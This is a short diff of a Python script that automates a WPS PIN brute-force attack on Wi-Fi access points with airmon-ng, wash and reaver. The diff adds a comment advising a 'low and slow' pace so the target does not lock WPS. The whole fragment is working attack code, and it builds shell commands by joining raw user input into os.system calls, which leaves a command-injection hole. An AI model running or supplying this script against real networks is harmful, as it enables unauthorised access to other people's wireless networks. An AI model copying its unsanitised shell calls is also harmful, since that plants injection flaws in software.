@@ -10,4 +10,5 @@ os.system("airmon-ng start " + WLANinput)
 os.system("echo Control+C when your done looking")
 os.system("wash -i " + WLANinput)
 MACinput=raw_input("\nEnter MAC Address for Accesspoint:")
+# THIS IS GOING TO BE LOW AND SLOW IOT AVOID LOCKING WPS IF POSSIBLE. IF YOUR TESTING WPS USE OFFLINE SCRIPT SLICK
 os.system("reaver -i " + WLANinput + " -b " + MACinput + " -d 45 -S -N -W -vv -l 60 -x 10 -r 5")
